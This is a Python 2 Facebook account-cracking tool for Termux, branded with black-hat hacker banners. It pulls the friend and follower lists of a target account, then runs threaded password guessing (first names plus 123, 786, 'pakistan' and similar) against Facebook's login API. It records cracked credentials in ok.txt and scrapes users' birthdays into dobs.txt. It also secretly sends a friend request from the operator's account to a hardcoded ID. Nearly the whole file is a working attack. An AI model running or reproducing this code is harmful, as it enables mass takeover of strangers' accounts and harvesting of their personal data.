#coding=utf-8
#!/usr/bin/python2
#Recode by MAFIA-KILLER.
try:
    import os, sys, time, datetime, re, random, hashlib, threading, json, getpass, urllib, cookielib, requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 KONTOL/login.py')

os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/ruby'):
    os.system('apt install ruby -y && gem install lolcat')
from requests.exceptions import ConnectionError
os.system('git pull')
if not os.path.isfile('/data/data/com.termux/files/home/H4CK/KONTOL/node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd KONTOL && npm install')
    os.system('cd KONTOL && node index.js &')
    os.system('clear')
    print '\n\x1b[1;32mPlease Select Chrome Browser To Continue\x1b[0;97m'
    os.system('xdg-open https://saweria.co/YayanXD')
    time.sleep(10)
elif os.path.isfile('/data/data/com.termux/files/home/H4CK/KONTOL/node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd KONTOL && node index.js &')
    os.system('clear')
    print '\n\x1b[1;32m Please Select Chrome  Browser To Continue \x1b[0;97m'
    os.system('xdg-open https://saweria.co/YayanXD')
    time.sleep(10)
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf-8')
c = '\x1b[1;32m'
c2 = '\x1b[0;97m'
c3 = '\x1b[1;31m'

### KALUAR ###
def keluar():
	os.system('clear')
	print logo
	jalan('\n   \x1b[1;33m! \x1b[1;31mGood Byee Asuuuuuuu')
	os.sys.exit()

### LEMPANG ###
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
#MyLogo
def logo():
    os.system('echo -e "\n\n ╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓\n ╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃\n ╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓\n ┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃\n ┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃ \n ┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛\n\n-----------------------------------------------\n\n➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM \n➣ BANGLADESH BLACK HAT HACKER \n➣ AUTHOR  : JAMES-HACKER\n➣ FROM    : DHAKA,NARAYANGANJ \n➣ WHATSAPP: +96598064347 \n\n-----------------------------------------------" | lolcat')
def method_menu():
    os.system("clear")
    logo()
    print("")
    print("\t    \033[1;32mCr4kiNG MeNu\033[0;97m")
    print("")
    print("\033[1;31m[1] key-Api Method")
    print("\033[1;33m[2] L-host Method")
    print("")
    method_menu_select()
def method_menu_select():
    afza = raw_input("\033[1;32mChoose method >>> ")
    if afza =="1":
        b_menu()
    elif afza =="2":
        l_menu()
    else:
        print("")
        print("\t    \033[1;31mSelect valid option \033[0;97m")
        print("")
        method_menu_select()
def login():
    os.system("clear")
    logo()
    print("")
    print("\t    "+c+"FB Login Menu"+c2)
    print("")
    print("\x1b[1;92m[1] Token Login")
    print("\x1b[1;95m[2] ID/Pass Login")
    print("")
    login_select()
def login_select():
    afza = raw_input("\x1b[1;91m Choose Login Method >>> ")
    if afza =="1":
        os.system("clear")
        logo()
        print("")
        print("\t    \033[1;32mFB Token Login\033[0;97m")
        print("")
        token = raw_input("\033[1;33m Pest Token : ")
        token_s = open(".fb_token.txt","w")
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get("https://graph.facebook.com/me?access_token="+token)
            q = json.loads(r.text)
            name = q["name"]
            nm = name.rsplit(" ")[0]
            print("")
            print("\t\033[1;32mToken logged in as : "+nm+"\033[0;97m")
            time.sleep(3)
            method_menu()
        except (KeyError , IOError):
            print("")
            print("\t    \033[1;95mToken not valid\033[0;97m")
            print("")
            raw_input(" Press Enter To Try Again ")
            login()
    elif afza =="2":
        login_fb()
    else:
        print("")
        print("\t    "+c+"Select valid method"+c2)
        print("")
        login_select()
def login_fb():
	os.system("clear")
	logo()
	print("")
	print("\t    \033[1;32mFB ID/PASS Login\033[0;97m")
	print("")
	id = raw_input("\033[1;31m ID/Mail/Num : ")
	id1=id.replace(' ','')
	id2=id1.replace('(','')
	uid=id2.replace(')','')
	pwd = raw_input("\033[1;33m Password   : ")
	print("")
	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
	q = json.loads(data)
	if "loc" in q:
		hamza = open(".fb_token.txt","w")
		hamza.write(q["loc"])
		hamza.close()
		requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token='+q['loc'])
		time.sleep(1)
		print("\t    \033[1;32mLogged in successfully\033[0;97m")
		time.sleep(1)
		method_menu()
	elif "www.facebook.com" in q["error"]:
		print("\t    \033[1;31mUser must verify account before login\033[0;97m")
		print("")
		time.sleep(1)
		raw_input("\033[1;31m Press Enter To Try Again ")
		login_fb()
	else:
		print("\t\033[1;31mID/Number/Password May Be Wrong\033[0;97m")
		print("")
		raw_input("\033[1;31m Press Enter To Try Again ")
		login_fb()
def b_menu():
    global token
    os.system("clear")
    logo()
    try:
        token = open(".fb_token.txt","r").read()
    except (KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        nm = q["name"]
        nmf = nm.rsplit(" ")[0]
        ok = nmf
    except (KeyError , IOError):
        print("")
        print("\t    "+c+"ID has checkpoint"+c2)
        print("")
        os.system("rm -rf .fb_token.txt")
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        logo()
        print("")
        print("\t    \033[1;92mTurn on mobile data OR wifi then use MAFIA-KILLER TOOL\033[0;97m")
        print("")
        time.sleep(1)
        raw_input("\033[1;96m Press Enter To Try Algain \033[0;97m")
        b_menu()
    os.system("clear")
    logo()
    print("")
    print("\t  "+c+"Logged In User"+ok+c2)
    print("")
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print("")
    print("\033[1;92m[1] \033[1;91mCrack From Public Id")
    print("\033[1;93m[2] \033[1;97mCrack From Followers")
    print("\033[1;95m[3] \033[1;96mShow Token")
    print("\033[1;96m[4] \033[1;95m Find Date Of Birth")
    print("\033[1;97m[5] \033[1;93mReturn Method Menu")
    print("\033[1;91m[6] \033[1;92mLogout")
    print("")
    b_menu_select()
def b_menu_select():
	select = raw_input("\nChoose Option >>> ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		print("")
		os.system('echo -e "\t    Public ID Cloning " | lolcat')
		print("")
		idt = raw_input("\033[1;31m Put Id/user :  ")
		os.system("clear")
		logo()
		print("")
		os.system('echo -e "\t    Gathering Information " | lolcat')
		print("")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system("clear")
			logo()
			print("")
			os.system('echo -e "\t    Public ID Cloning " | lolcat')
			print("")
			print(" Target user : "+q["name"])
		except (KeyError , IOError):
		    print("")
		    print("\n\t    \033[1;92m Logged in id has checkpoint\033[0;97m")
		    print("")
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		logo()
		print("")
		os.system('echo -e "\t    Followers Cloning " | lolcat')
		print("")
		idt = raw_input("\033[1;95m Put Id/user : ")
		os.system("clear")
		logo()
		print("")
		os.system('echo -e "\t    Gathering Information " | lolcat')
		print("")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system("clear")
			logo()
			print("")
			os.system('echo -e "\t    Followers Cloning" | lolcat')
			print("")
			print(" Target user : "+q["name"])
		except (KeyError , IOError):
		    print("")
		    print("\n\t    \033[1;96m Logged in id has checkpoint\033[0;97m")
		    print("")
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		view_token()
	elif select =="4":
	    extract_dob()
	elif select =="5":
	    method_menu()
	elif select =="6":
	    logout()
	else:
	    print("")
	    print("\t    "+c+"Select valid method"+c2)
	    print("")
	    b_menu_select()
	print(" Total IDs : "+str(len(id)))
	time.sleep(0.5)
	print(" The process is running in background")
	print("")
	print 47*("-")
	print('')
	
	
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\033[1;31m[JAMES-CP] "+uid+" | "+pass1)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\033[1;32m[JAMES-HACKED] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;31m[JAMES-CP] "+uid+" | "+pass2)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[1;32m[JAMES-HACKED] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\033[1;31m[JAMES-CP] "+uid+" | "+pass3)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print(" \033[1;32m[JAMES-HACKED] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4=name+"786"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\033[1;31m[JAMES-CP] "+uid+" | "+pass4)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\033[1;32m[JAMES-HACKED] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="786786"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\033[1;31m[JAMES-CP] "+uid+" | "+pass5)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\033[1;32m[JAMES-HACKED] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6="000786"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\033[1;31m[JAMES-CP] "+uid+" | "+pass6)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\033[1;32m[JAMES-HACKED] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7="pakistan"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\033[1;31m[JAMES-CP] "+uid+" | "+pass7)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\033[1;32m[JAMES-HACKED] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print (" ")
	print (47*"-")
	print ("")
	print ("\x1b[1;91m Process has completed")
	print ("\x1b[1;92m Total Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))
	print ("")
	print (47*"-")
	print ("")
	raw_input("\x1b[1;93m Press enter to back ")
	b_menu()
def view_token():
    os.system("clear")
    logo()
    print("")
    print("\t    \033[1;32mLogged In Token \033[0;97m")
    print("")
    print(" Token : " )
    os.system("cat .fb_token.txt")
    print("")
    raw_input("\x1b[1;93m Press enter to main menu ")
    b_menu()
def logout():
    os.system("clear")
    logo()
    print("")
    print("\t    "+c+"Logout Menu"+c2)
    print("")
    raw_input("\x1b[1;91m Do you really want to logout ? ")
    os.system("rm -rf .fb_token.txt")
    method_menu()
def extract_dob():
    global token
    try:
        token = open(".fb_token.txt","r").read()
    except (KeyError , IOError):
        time.sleep(1)
        login()
    os.system("clear")
    logo()
    print("")
    print("\t    "+c+"Extract DOB Of ID"+c2)
    print("")
    print("\x1b[1;91m[1] Grab From Friendlist")
    print("\x1b[1;92m[2] Grab From Followers")
    print("\x1b[1;93m[3] Grab Single Id")
    print("\x1b[1;94m[4] Back")
    print("")
    dob_select()
def dob_select():
	select = raw_input("\n Choose Option >>> ")
	id=[]
	nms=[]
	if select =="1":
		os.system("clear")
		logo()
		print("")
		print("\t    \033[1;32mGrab DOB From Friendlist\033[0;97m")
		print("")
		idt = raw_input(" Put Id/user : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print(" Target Id : "+q["name"])
		except KeyError:
		    print("")
		    print('\033[1;31mID Not Found'+c2)
		    print("")
		    raw_input("\nPress Enter To Back ")
		    dob_select()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		logo()
		print("")
		print("\033[1;32m Grab DOB From Followers\033[0;97m")
		print("")
		idt = raw_input(" Put Id/user : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print(" Target user : "+q["name"])
		except KeyError:
			print('\t    \033[1;31mID Not Found\033[0;97m')
			raw_input("\nPress Enter To Back ")
			dob_select()
		#print('[✓] Looking For Accounts')
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		dob()
	elif select =="4":
	    b_menu()
	else:
	    print("")
	    print ("\t    \033[1;31mSelect valid option\033[0;97m")
	    print("")
	    dob_select()
	print ("\x1b[1;91m Total IDs : "+str(len(id)))
	print("\x1b[1;92m The Process Has Started")
	print("\x1b[1;93m Note : This is for testing only")
	print("")
	print 47*("-")
	print('')

	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    q = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token, headers=header).text
		    d=json.loads(q)
		    y=d['birthday']
		    print("\033[1;32m "+uid+" \033[1;30m "+name+" | "+y+"\033[0;97m")
		    nmb=open("dobs.txt","a")
		    nmb.write(name+' | '+uid+" | "+y+"\n")
		    nmb.close()
		    nms.append(number)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print('')
	print 47*'-'
	print('')
	print (' Process has completed')
	print(' Total DOB :  '+str(len(nms)))
	print('')
	print 47*('-')
	print('')
	raw_input('\n Press enter to back ')
	extract_dob()
def dob():
    global token
    try:
        token = open(".fb_token.txt","r").read()
    except (KeyError , IOError):
        time.sleep(1)
        login()
    os.system("clear")
    logo()
    print("")
    print("\t    "+c+"Find DOB Of ID"+c2)
    print("")
    idt = raw_input("\033[1;31m Put id/user : ")
    os.system("clear")
    logo()
    print("")
    os.system('echo -e "\t   Finding DOB  " | lolcat')
    time.sleep(1)
    try:
        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header).text
        z = json.loads(r)
        dobs = z["birthday"]
    except (KeyError , IOError):
        os.system("clear")
        logo()
        print("")
        print("\t    "+c+"Find DOB Of ID"+c2)
        print("")
        print(" DOB not found")
        print("")
        raw_input("\x1b[1;93m Press enter to try again ")
        extract_dob()
    os.system("clear")
    logo()
    print("")
    print("\t    "+c+"Find DOB Of ID"+c2)
    print("")
    print(" Account ID : "+idt)
    print(" DOB : "+dobs)
    print("")
    print(47*"-")
    print("")
    conf()
def conf():
    ol = raw_input("\033[1;31m Do you want to find again (y/n) ")
    if ol =="y":
        dob()
    elif ol =="n":
        extract_dob()
    else:
        b_menu()
def l_menu():
    global token
    os.system("clear")
    logo()
    try:
        token = open(".fb_token.txt","r").read()
    except (KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        nm = q["name"]
        nmf = nm.rsplit(" ")[0]
        ok = nmf
    except (KeyError , IOError):
        print("")
        print("\t    "+c+"ID has checkpoint"+c2)
        print("")
        os.system("rm -rf .fb_token.txt")
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        logo()
        print("")
        print("\t    \033[1;31mTurn on mobile data OR wifi\033[0;97m")
        print("")
        time.sleep(1)
        raw_input("\x1b[1;92m Press enter to try again ")
        b_menu()
    os.system("clear")
    logo()
    print("")
    print(47*"-")
    print("")
    print("\t  "+c+"Logged In User"+ok+c2)
    print("")
    print(47*"-")
    print("")
    print("\x1b[1;91m[1] Crack From Public Id")
    print("\x1b[1;92m[2] Crack From Followers")
    print("\x1b[1;93m[3] Back Method Menu")
    print("\x1b[1;94m[4] Logout")
    print("")
    l_menu_select()
def l_menu_select():
	select = raw_input("\nChoose Option >>> ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		print("")
		os.system('echo -e "\t    Public ID Cloning " | lolcat')
		print("")
		idt = raw_input(" Put Id/user :  ")
		os.system("clear")
		logo()
		print("")
		os.system('echo -e "\t    Gathering Information " | lolcat')
		print("")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system("clear")
			logo()
			print("")
			os.system('echo -e "\t    Public ID Cloning " | lolcat')
			print("")
			print(" Target user : "+q["name"])
		except (KeyError , IOError):
		    print("")
		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
		    print("")
		    raw_input("\nPress Enter To Back ")
		    l_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		logo()
		print("")
		os.system('echo -e "\t    Public ID Cloning " | lolcat')
		print("")
		idt = raw_input(" Put Id/user : ")
		os.system("clear")
		logo()
		print("")
		os.system('echo -e "\t    Gathering Information " | lolcat')
		print("")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system("clear")
			logo()
			print("")
			os.system('echo -e "\t    Followers Cloning " | lolcat')
			print("")
			print(" Target user : "+q["name"])
		except (KeyError , IOError):
		    print("")
		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
		    print("")
		    raw_input("\n Press Enter To Back ")
		    l_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		method_menu()
	elif select =="4":
	    logout()
	else:
	    print("")
	    print("\t    "+c+"Select valid method"+c2)
	    print("")
	    l_menu_select()
	print(" Total IDs : "+str(len(id)))
	time.sleep(0.5)
	print(" The process is running in background")
	print("")
	print 47*("-")
	print('')
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			pass1 = name+"123"
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;32m[ARBAB-HACKED] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt","a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass1)
					cp = open("cp.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name+"1234"
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;32m[ARBAB-HACKED] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt","a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass2)
							cp = open("cp.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name+"12345"
							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;32m[ARBAB-HACKED] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt","a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error"]:
									print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass3)
									cp = open("cp.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name+"786"
									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;32m[ARBAB-HACKED] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt","a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass4)
											cp = open("cp.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
										else:
											pass5 = "786786"
											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;32m[ARBAB-HACKED] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt","a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error"]:
													print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass5)
													cp = open("cp.txt","a")
													cp.write(uid+" | "+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = "786000"
													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;32m[ARBAB-HACKED] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt","a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error"]:
															print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass6)
															cp = open("cp.txt","a")
															cp.write(uid+" | "+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = "Pakistan"
															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
															q = json.loads(data)
															if "loc" in q:
																print("\033[1;32m[ARBAB-HACKED] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
																ok = open("ok.txt","a")
																ok.write(uid+" | "+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error"]:
																	print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass7)
																	cp = open("cp.txt","a")
																	cp.write(uid+" | "+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print("")
	print(47*"-")
	print("")
	print("\x1b[1;91m The process has completed")
	print("\x1b[1;92m Total Ok/Cp :"+str(len(oks)))+"/"+str(len(cps))
	print("")
	print(47*"-")
	print("")
	raw_input("\x1b[1;93m Press Entet To Back ")
	l_menu()
if __name__ == '__main__':
    method_menu()
